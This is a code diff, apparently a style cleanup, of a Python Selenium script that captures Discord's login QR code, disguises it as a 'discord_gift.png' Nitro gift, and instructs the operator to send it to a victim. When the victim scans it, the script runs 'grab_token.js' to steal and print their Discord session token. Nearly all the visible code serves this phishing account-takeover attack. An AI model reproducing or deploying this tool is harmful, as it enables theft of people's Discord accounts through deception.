@@ -37,17 +37,21 @@ def main():
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
     options.add_experimental_option('detach', True)
-    driver = webdriver.Chrome(options=options, service=Service(r'chromedriver.exe'))
+
+    driver = webdriver.Chrome(
+        options=options,
+        service=Service(r'chromedriver.exe'),
+    )
 
     driver.get('https://discord.com/login')
 
     WebDriverWait(driver, 15).until(
-        EC.presence_of_element_located((By.CSS_SELECTOR, ".qrCode-wG6ZgU"))
+        EC.presence_of_element_located((By.CSS_SELECTOR, '.qrCode-wG6ZgU'))
     )
 
     while True:
-        qr_code = driver.find_element(By.CSS_SELECTOR, ".qrCode-wG6ZgU")
-        if "spinner-2enMB9" in qr_code.get_attribute("class"):
+        qr_code = driver.find_element(By.CSS_SELECTOR, '.qrCode-wG6ZgU')
+        if 'spinner-2enMB9' in qr_code.get_attribute('class'):
             time.sleep(0.5)
         else:
             break
@@ -72,24 +76,24 @@ def main():
     paste_template()
 
     print('- QR Code has been generated. > discord_gift.png')
-    print('Send the QR Code to user and scan. Waiting..\n')
+    print('Send the QR Code to user and scan. Waiting...\n')
 
     while True:
         if discord_login != driver.current_url:
-            print('Grabbing token..')
-            token = driver.execute_script(open("grab_token.js", "r").read())
+            print('Grabbing token...')
+            token = driver.execute_script(open('grab_token.js', 'r').read())
             print('Token grabbed:', token)
             break
 
     print('\nTask complete.')
-    print("Press any key to exit...", end="")
+    print('Press any key to exit...', end='')
 
 
 if __name__ == '__main__':
     try:
         main()
     except Exception:
-        print("\nAn Unexpected Error Has Occured")
-        print("The program will now exit...", end="")
+        print('\nAn Unexpected Error Has Occured')
+        print('The program will now exit...', end='')
 
     input()
